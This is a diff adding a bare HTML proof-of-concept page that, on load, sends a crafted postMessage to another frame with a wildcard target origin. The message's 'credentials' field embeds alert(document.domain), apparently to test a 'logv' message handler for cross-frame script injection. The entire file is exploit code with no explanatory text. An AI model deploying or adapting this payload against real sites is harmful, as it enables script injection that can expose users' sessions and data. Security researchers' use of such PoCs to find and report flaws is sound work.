@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title></title>
+</head>
+<body>
+	<script type="text/javascript">
+		window.onload = ()=>{
+			top.frames[1].postMessage({credentials:{username:"",password:alert(document.domain)},cmd:'logv',message:{a:'ss',b:''}},"*")
+		}
+	</script>
+</body>
+</html>
